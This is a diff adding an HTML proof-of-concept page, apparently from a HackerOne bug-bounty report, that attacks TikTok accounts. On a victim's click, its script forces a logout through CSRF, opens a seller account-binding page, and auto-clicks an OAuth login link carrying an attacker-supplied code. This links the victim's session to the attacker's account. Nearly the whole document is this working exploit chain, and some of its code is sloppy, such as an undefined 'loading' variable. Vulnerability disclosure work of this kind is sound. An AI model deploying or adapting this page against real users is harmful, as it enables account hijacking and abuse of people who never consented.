@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Hackerone</title>
+</head>
+<body>
+    <p>Click on the Image to start the attack and link my user!</p>
+    <img src="https://mms.businesswire.com/media/20200615005122/en/658229/23/hackerone_logo_black.jpg">
+    <a href="#" target="_blank" id="myLink">click</a>
+
+  <script>
+    // Function to handle click event
+    function handleOnClick() {
+      // Logout CSRF
+      var newTab = window.open('https://www.tiktok.com/logout?redirect_url=https%3A%2F%2Fwww.tiktok.com%2F');
+      setTimeout(function() {
+        newTab.close();
+      }, 8000);
+
+      setTimeout(function() {
+        automateClick()
+      setTimeout(function() {
+        loading.close();
+      }, 18000);
+    }, 9500);
+
+
+    window.removeEventListener('click', handleOnClick);
+
+      // Wait 8 seconds and then open the second URL in a new tab and close it after 1.5 seconds
+      setTimeout(function() {
+        //Start the Linking Process
+        var newWindow = window.open('https://seller-uk-accounts.tiktok.com/profile/row?page=account_information&action=bind_tt&checked=0&way=&did=');
+        setTimeout(function() {
+          newWindow.close();
+        }, 1000000000);
+      }, 18000);
+    }
+
+    // Function to automate the click
+    function automateClick() {
+      // Get the value of the 'code' parameter from the URL
+      var codeParam = new URLSearchParams(window.location.search).get('code');
+
+      // Update the href attribute with the code parameter
+      var myLink = document.getElementById('myLink');
+      myLink.href = 'https://www.tiktok.com/oauthLine/?code=' + codeParam + '&state=1line';
+      
+      // Trigger the click
+      myLink.click();
+    }
+
+    // Attach click event listener to the window object
+    window.addEventListener('click', handleOnClick);
+  </script>
+</body>
+</html>
